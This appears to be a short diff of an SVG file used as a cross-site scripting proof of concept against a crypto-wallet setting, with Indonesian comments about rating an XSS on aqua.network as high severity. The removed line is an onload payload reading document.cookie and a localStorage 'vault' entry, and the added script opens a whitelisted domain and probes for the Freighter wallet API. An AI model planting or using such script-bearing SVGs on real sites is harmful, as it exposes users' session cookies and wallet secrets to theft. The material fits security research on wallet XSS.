@@ -1,1 +1,9 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie); alert(localStorage.getItem('vault'))">
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>
+// Coba buka whitelisted domain dari dalam SVG kamu
+window.open("https://aqua.network", "_blank");
+// Kalau di tab baru itu kamu bisa alert(document.domain) = aqua.network
+// Berarti kamu bisa XSS aqua.network dari domain kamu = HIGH
+alert("My origin: " + location.origin + "\nTrying to access Freighter API: " + !!window.freighterApi);
+</script>
+</svg>
